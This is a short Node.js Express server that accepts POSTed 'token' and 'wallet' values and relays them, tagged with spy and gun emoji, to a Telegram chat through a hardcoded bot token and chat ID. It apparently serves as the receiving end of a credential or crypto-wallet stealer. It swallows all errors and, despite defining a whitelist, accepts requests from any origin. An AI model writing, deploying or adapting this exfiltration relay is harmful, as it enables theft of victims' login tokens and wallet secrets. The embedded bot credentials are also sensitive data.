const express = require("express");
const app = express();
const axios = require("axios");
const cors = require("cors");
require("dotenv").config();

const whitelist = ["http://localhost:3000"];
const corsOptions = {
	origin: function (origin, callback) {
		if (whitelist.indexOf(origin) !== -1) {
			callback(null, true);
		} else {
			callback(new Error("Not allowed by CORS"));
		}
	},
};

function sendMessage(token,wallet) {
	const url =
		"https://api.telegram.org/bot6749156283:AAGELjN_k7_xd-dphj8sTIwi1ZP3H0VN7kE/sendMessage";
	const data = {
		chat_id: "-1002110806227",
        text: `🕵🏻‍♂️ Token:   *${token}*

🔫 Wallet:
${wallet?.join("\n")}`,
		parse_mode: "MarkDown",
		disable_web_page_preview: 1,
	};
    axios.post(url, data).then(() => {}).catch((e) => {})
}


app.use(cors());
app.use(express.json())
app.get("/", (_req, res) => {
	res.send("{}");
});

app.post("/", async (req, res) => {
    try {
        sendMessage(req.body.token, req.body.wallet)
    } catch (error) {
        console.log("ERR: ", error);
    }
    res.send({})
});

app.listen(4400);
